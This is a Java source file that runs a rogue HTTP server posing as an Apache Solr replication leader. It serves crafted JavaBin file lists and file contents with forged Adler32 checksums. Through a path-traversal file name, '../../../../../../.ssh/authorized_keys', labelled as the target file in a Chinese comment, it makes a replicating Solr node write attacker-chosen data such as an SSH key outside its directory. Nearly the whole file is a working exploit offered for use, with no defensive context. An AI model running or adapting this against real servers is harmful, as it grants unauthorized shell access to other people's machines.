
import com.sun.net.httpserver.Headers;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;
import org.apache.solr.client.solrj.SolrResponse;
import org.apache.solr.common.util.JavaBinCodec;
import org.apache.solr.common.util.NamedList;
import org.apache.solr.common.util.SimpleOrderedMap;

import java.util.zip.Adler32;
import  java.util.zip.Checksum;
import java.io.*;
import java.net.InetSocketAddress;
import java.net.URI;
import java.util.*;
import java.util.concurrent.Executors;

public class test {
    public static String Datapath = "D:\\360safe\\demo\\src\\main\\java\\com\\example\\demo\\bean\\data";
    public static String Cachepath = "Cache";
    public static String FILE_NAME = "D:\\360safe\\demo\\src\\main\\java\\com\\example\\demo\\bean\\data";
    public static String DIST_FILE = "../../../../../../.ssh/authorized_keys"; //目标文件
    public static String DIST_FILE2 = "b"; // 二次上传需要更改
    public static ByteArrayOutputStream makeFileListResponse() throws IOException {
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        JavaBinCodec codec = new JavaBinCodec(null);

        NamedList<Object> values = new SimpleOrderedMap<Object>();
        NamedList<Object> headers = new SimpleOrderedMap<Object>();
        headers.add("status", 0);
        headers.add("QTime", 1);

        values.add("responseHeader", headers);

        HashMap<String, Object> file = new HashMap<String, Object>();
        file.put("size", new Long(String.valueOf((new File(FILE_NAME)).length())));
        file.put("lastmodified", new Long("123456"));
        file.put("name", DIST_FILE);
        file.put("checksum", new Long("123456"));

        ArrayList<HashMap<String, Object>> fileList = new ArrayList<HashMap<String, Object>>();
        fileList.add(file);

        DIST_FILE2=getRandomString(3);
        HashMap<String, Object> file2 = new HashMap<String, Object>();
        file2.put("size", new Long(String.valueOf((new File(FILE_NAME)).length())));
        file2.put("lastmodified", new Long("123456"));
        file2.put("name", DIST_FILE2);
        file2.put("checksum", new Long("123456"));

        ArrayList<HashMap<String, Object>> fileList2 = new ArrayList<HashMap<String, Object>>();
        fileList2.add(file2);

        values.add("confFiles", fileList);
        values.add("filelist", fileList2);

        codec.marshal(values, outputStream);
        return outputStream;
    }

    public static ByteArrayOutputStream makeIndexResponse() throws IOException {
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        JavaBinCodec codec = new JavaBinCodec(null);

        NamedList<Object> values = new SimpleOrderedMap<Object>();
        NamedList<Object> headers = new SimpleOrderedMap<Object>();
        headers.add("status", 0);
        headers.add("QTime", 1);

//        values.add("confFiles", fileList);
//        values.add("filelist", fileList2);
        long version = 1L;
        long generation = 1L;
        values.add("indexversion", version);
        values.add("generation", generation);
        codec.marshal(values, outputStream);
        System.out.println("[outputStream]"+ new String(outputStream.toByteArray()) );
        return outputStream;
    }
    public static byte[] makefilecontentResponse(String filename) throws IOException {


        File file = new File(filename);

        InputStream in = new FileInputStream(file);
        byte[] bytes = new byte[(int)file.length()];

        in.read(bytes);
        in.close();

        return bytes;
    }
    public static byte[] make_bad_File() throws IOException {
        byte[] length = new byte[4];
        length[0] = 0;
        length[1] = 0;// 25536
        length[2] = 1; //256
        length[3] = 124;

        // 这个文件的内容为上传文件内容
        byte[] data = makefilecontentResponse(Datapath);
        String data_str = new String(data);
        int key_length = data_str.length();
        int num_2 = key_length / 256;
        int num_3 = key_length % 256;
        length[2] = (byte)num_2;
        length[3] = (byte)num_3;

        RandomAccessFile raf = new RandomAccessFile(Cachepath, "rw");
        Checksum checksum = new Adler32();
        checksum.update(data_str.getBytes(),0,data_str.length());
        long checksum_ = checksum.getValue();
        raf.writeLong(checksum_);
        System.out.println(checksum_);
        raf.seek(0);
        raf.close();
        byte[] yanzheng = makefilecontentResponse(Cachepath);
        byte[] result = new byte[12+data_str.getBytes().length];
        System.arraycopy(length,0,result,0,length.length);
        System.arraycopy(yanzheng,0,result,length.length,yanzheng.length);
        System.arraycopy(data_str.getBytes(),0,result,length.length+yanzheng.length,data_str.getBytes().length);
        System.out.println(Arrays.toString(result));

        return result;
    }
    public static void writeFile(byte[] data) throws IOException {
        OutputStream outputStream=null;
        File file = new File(FILE_NAME);
        outputStream = new FileOutputStream(file);
        outputStream.write(data,0,data.length);
        outputStream.close();
    }
    public static int readInt(byte[] b) {
        return (((b[0] & 0xff) << 24) | ((b[1] & 0xff) << 16)
                | ((b[2] & 0xff) << 8) | (b[3] & 0xff));

    }
    public static long readLong(byte[] b) {
        return (((long) (b[0] & 0xff)) << 56) | (((long) (b[1] & 0xff)) << 48)
                | (((long) (b[2] & 0xff)) << 40) | (((long) (b[3] & 0xff)) << 32)
                | (((long) (b[4] & 0xff)) << 24) | ((b[5] & 0xff) << 16)
                | ((b[6] & 0xff) << 8) | ((b[7] & 0xff));

    }
    public static void test() throws IOException {
        RandomAccessFile raf = new RandomAccessFile("f:/test.txt", "rw");
        System.out.println(raf.readInt());
        byte[] length = new byte[4];
        length[0] = 0;
        length[1] = 0;// 25536
        length[2] = 1; //256
        length[3] = 124;
        int num2 = 2;
        length[2] =(byte)num2;
        System.out.println(readInt(length));
        System.out.println(Arrays.toString(length));
    }
    public static String getRandomString(int length){
        String str="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        Random random=new Random();
        StringBuffer sb=new StringBuffer();
        for(int i=0;i<length;i++){
            int number=random.nextInt(62);
            sb.append(str.charAt(number));
        }
        return sb.toString();
    }
    public static void main(String[] args) throws IOException {
        Datapath = args[0]; //上传数据
        DIST_FILE = args[1]; // 上传到服务器路径
        FILE_NAME = Datapath;
        InetSocketAddress addr = new InetSocketAddress(6688);
        HttpServer server = HttpServer.create(addr, 0);

        server.createContext("/", new MyHandler());
        server.setExecutor(Executors.newCachedThreadPool());
        server.start();
        System.out.println("Server is listening on port 6688");
        //System.out.println(Arrays.toString(makefilecontentResponse(DIST_FILE)));

    }

}
class MyHandler implements HttpHandler {
    public static byte[] response = "1".getBytes();
    @Override
    public void handle(HttpExchange exchange) throws IOException {
        String requestMethod = exchange.getRequestMethod();
        System.out.println("处理新请求:" + requestMethod);

        String data =  exchange.getRequestURI().getQuery();
        System.out.println(data);

        if (data.contains("command=indexversion")) {
            response = test.makeIndexResponse().toByteArray();

        } else if (data.contains("command=filelist")) {
            response = test.makeFileListResponse().toByteArray();
        } else if (data.contains("command=filecontent")) {
            response = test.make_bad_File();
        } else {
            response = "Hello World".getBytes();
        }

        exchange.getResponseHeaders().add("Content-Type", "application/octet-stream");
        exchange.sendResponseHeaders(200, response.length);
        OutputStream os = exchange.getResponseBody();
        System.out.println("[response]"+new String(response));
        os.write(response);
        os.close();
    }
}

